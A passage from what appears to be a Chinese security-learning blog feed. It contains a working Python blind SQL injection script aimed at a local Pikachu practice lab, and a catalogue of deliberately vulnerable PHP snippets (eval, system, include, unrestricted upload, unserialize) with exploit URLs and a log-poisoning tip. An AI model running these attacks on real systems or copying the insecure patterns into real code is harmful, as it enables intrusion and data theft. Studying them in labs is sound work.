class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Program name %s\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span>( argc == <span class="number">2</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The argument supplied is %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>( argc &gt; <span class="number">2</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Too many arguments supplied.\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"One argument expected.\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用一个用空格分隔的简单参数，参数括在双引号中，编译并执行上面的代码，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./a.out <span class="string">"testing1 testing2"</span></span><br><span class="line"></span><br><span class="line">Progranm name ./a.out</span><br><span class="line">The argument supplied is testing1 testing2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习C语言，自己做的笔记。&lt;del&gt;其实大多是抄菜鸟教程的，只是是自己理解要记的部分。&lt;/del&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="C" scheme="/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Python注入爆库脚本</title>
    <link href="/2019/07/16/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/"/>
    <id>/2019/07/16/Python注入爆库脚本/</id>
    <published>2019-07-15T16:00:00.000Z</published>
    <updated>2019-07-16T13:45:19.246Z</updated>
    
    <content type="html"><![CDATA[<p>最近写的，然后记录一下，留着以后可以改改再用。</p><a id="more"></a><h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><p>用之前的环境，来写一下。然后讲一下，就放代码了。</p><p><a href="https://9finger.cn/passages/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2/" title="靶场">靶场</a></p><p>前面的文章也讲的很清楚了，一个get注入，post注入同理，改一下payload就可以了。</p><p>理解一下SQL语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,email <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">where</span> username=<span class="string">'kobe'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">113</span>;</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/1.png" class="lazyload"></p><h3 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,email <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">where</span> username=<span class="string">'kobe'</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/2.png" class="lazyload"></p><p>查询表member内username为kobe的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and</span><br></pre></td></tr></table></figure><p>数据库的逻辑运算符，且运算，两个都为真才为真。也就是后面的语句</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))&lt;113;</span><br></pre></td></tr></table></figure><p>也为真才能执行。这个语句的意思是：查询数据库名从第一个开始截取的第一个字符，然后再把这个字符转换成ASCII码，然后判断是否小于113，第一个字符是：P，对应的ASCII为112。</p><p><img alt data-src="/images/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/3.png" class="lazyload"></p><p>当第二个条件为真时，在web端的查询就会返还出结果显示到页面中，我们可以通过返还的页面的长度判断第二个条件是否为真，通过这个原理爆破数据库内容。直接放源码。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">(vcode, count)</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/pikachu-master/vul/sqli/sqli_str.php?name=kobe+%27+and+ascii%28substr%28database%28%29%2C'</span> + str(</span><br><span class="line">        vcode) + <span class="string">'%2C1%29%29= '</span> + str(</span><br><span class="line">        count) + <span class="string">'%23&amp;submit=查询#&amp;submit=%E6%9F%A5%E8%AF%A2'</span></span><br><span class="line">    <span class="comment"># 发送请求包</span></span><br><span class="line">    r = requests.request(<span class="string">"GET"</span>, url)</span><br><span class="line">    r.encoding = <span class="string">'utf-8'</span>  <span class="comment"># 将内容转换成utf-8编码</span></span><br><span class="line">    <span class="keyword">return</span> len(r.text)  <span class="comment"># 返还内容长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span>  <span class="comment"># ascii码</span></span><br><span class="line">vcode = <span class="number">1</span>  <span class="comment"># 设置从哪一位开始</span></span><br><span class="line">payload(vcode, count)</span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">129</span>):</span><br><span class="line">    <span class="comment"># print("ascii码是" + str(count))</span></span><br><span class="line">    <span class="comment"># print("返还长度是" + str(payload(vcode, count)))</span></span><br><span class="line">    payload(vcode, count)</span><br><span class="line">    <span class="keyword">if</span> payload(vcode, count) == <span class="number">33277</span>:  <span class="comment"># 回显正常返还的长度为33277</span></span><br><span class="line">        <span class="comment"># chr(count)</span></span><br><span class="line">        print(chr(count))  <span class="comment"># 将ascii码转成字符再输出</span></span><br><span class="line">        vcode = vcode + <span class="number">1</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img alt data-src="/images/Python%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93%E8%84%9A%E6%9C%AC/4.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近写的，然后记录一下，留着以后可以改改再用。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="/categories/python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>PHP危险函数利用</title>
    <link href="/2019/07/10/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"/>
    <id>/2019/07/10/PHP危险函数利用/</id>
    <published>2019-07-09T16:00:00.000Z</published>
    <updated>2019-07-14T12:25:48.554Z</updated>
    
    <content type="html"><![CDATA[<p>对php的一些深度的学习。</p><a id="more"></a><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><code>passthru()</code></h3><p><strong>功能描述：</strong>允许执行一个外部程序并回显输出，类似于 exec()。</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">passthru($id);</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=whoami">http://127.0.0.1/test.php?x=whoami</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/1.png" class="lazyload"></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><p><strong>功能描述：</strong>允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。<br><strong>危险等级：</strong>高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">eval($id);</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=phpinfo()">http://127.0.0.1/test.php?x=phpinfo()</a>;</p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/2.png" class="lazyload"></p><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">system($id);</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=whoami">http://127.0.0.1/test.php?x=whoami</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/3.png" class="lazyload"></p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>功能描述：列出指定路径中的文件和目录。<br>危险等级：中</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&apos;x&apos;];</span><br><span class="line"></span><br><span class="line">// 以升序排序 - 默认</span><br><span class="line">$a = scandir($dir);</span><br><span class="line"></span><br><span class="line">// 以降序排序</span><br><span class="line">$b = scandir($dir,1);</span><br><span class="line"></span><br><span class="line">print_r($a);</span><br><span class="line">print_r($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=sqli">http://127.0.0.1/test.php?x=sqli</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/4.png" class="lazyload"></p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">echo shell_exec($id);</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=whoami">http://127.0.0.1/test.php?x=whoami</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/5.png" class="lazyload"></p><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>功能描述：执行一个命令并打开文件指针用于读取以及写入。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">    $descs = array( </span><br><span class="line">                0 =&gt; array( &apos;pipe&apos; , &apos;r&apos; ) ,  #输入</span><br><span class="line">                1 =&gt; array( &apos;file&apos; , &apos;output.txt&apos; , &apos;w&apos; ) , #输出，可以为管道或文件</span><br><span class="line">                2 =&gt; array( &apos;file&apos; , &apos;errors.txt&apos; , &apos;w&apos; )   #错误日志，可以为管道或文件</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    $res = proc_open( $id , $descs , $pipes );</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=whoami">http://127.0.0.1/test.php?x=whoami</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/7.png" class="lazyload"></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/8.png" class="lazyload"></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/10.png" class="lazyload"></p><h3 id="proc-get-status"><a href="#proc-get-status" class="headerlink" title="proc_get_status()"></a>proc_get_status()</h3><p>功能描述：获取使用 proc_open() 所打开进程的信息。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;x&apos;];</span><br><span class="line">    $descs = array( </span><br><span class="line">                0 =&gt; array( &apos;pipe&apos; , &apos;r&apos; ) ,  #输入</span><br><span class="line">                1 =&gt; array( &apos;file&apos; , &apos;output.txt&apos; , &apos;w&apos; ) , #输出，可以为管道或文件</span><br><span class="line">                2 =&gt; array( &apos;file&apos; , &apos;errors.txt&apos; , &apos;w&apos; )   #错误日志，可以为管道或文件</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    $res = proc_open( $id , $descs , $pipes );</span><br><span class="line">    //读取proc_open执行的进程信息，放入数组中</span><br><span class="line">$a= proc_get_status($res);</span><br><span class="line">//将数组迭代输出</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?x=whoami">http://127.0.0.1/test.php?x=whoami</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/11.png" class="lazyload"></p><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>功能描述：在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&apos;name&apos;];</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini">http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/12.png" class="lazyload"></p><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><p>如果解析器开启了错误日志，可以用nc.exe请求解析器，写入一句话，然后再讲错误日志包含执行，实现一句话木马效果。</p><p>远程包含：</p><p>需要打开<code>allow_url_include=On</code>、 <code>allow_url_fopen = On</code></p><p><a href="http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt">http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt</a>?</p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/13.png" class="lazyload"></p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>功能描述：把整个文件读入一个字符串中。<br>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;X&apos;];</span><br><span class="line">    echo file_get_contents($id);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?X=./1.txt">http://127.0.0.1/test.php?X=./1.txt</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/14.png" class="lazyload"></p><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>功能描述：读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false</p><p>危险等级：高</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;X&apos;];</span><br><span class="line">    echo readfile($id);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a href="http://127.0.0.1/test.php?X=./1.txt">http://127.0.0.1/test.php?X=./1.txt</a></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/15.png" class="lazyload"></p><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h3><p>功能描述：把上传的文件移动到新位置。</p><p>危险等级：高</p><p>示例代码：</p><p>upload.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt; </span><br><span class="line">  &lt;title&gt;显示文件&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;?php</span><br><span class="line">  </span><br><span class="line">//print_r($_FILES); </span><br><span class="line">  </span><br><span class="line">//获取到临时文件 </span><br><span class="line">$file=$_FILES[&apos;file&apos;]; </span><br><span class="line">//获取文件名 </span><br><span class="line">$fileName=$file[&apos;name&apos;]; </span><br><span class="line">//移动文件到当前目录 </span><br><span class="line">move_uploaded_file($file[&apos;tmp_name&apos;],$fileName); </span><br><span class="line">  </span><br><span class="line">//显示文件 </span><br><span class="line">echo &quot;&lt;img src=&apos;$fileName&apos;&gt;&quot;; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/16.png" class="lazyload"></p><p><img alt data-src="/images/PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/17.png" class="lazyload"></p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>功能描述：PHP反序列化漏洞，在我们使用<code>unserialize()</code>进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。</p><p>危险等级：高</p><h4 id="小理解"><a href="#小理解" class="headerlink" title="小理解"></a>小理解</h4><p>PHP的序列化是把想要传输的内容序列化传输，然后接收后再反序列化得到传输的内容，漏洞产生的原因是在传输的过程中序列化后的内容可修改，在传输过程中被修改后，再被接收反序列，然后使用了危险函数执行了传输的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class foo1&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    public $obj;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;varr-&gt;evaltest();</span><br><span class="line">        echo $varr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class foo2&#123;</span><br><span class="line">    public $str;</span><br><span class="line">    function evaltest()&#123;</span><br><span class="line">        eval($this-&gt;str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new foo1();</span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p><a 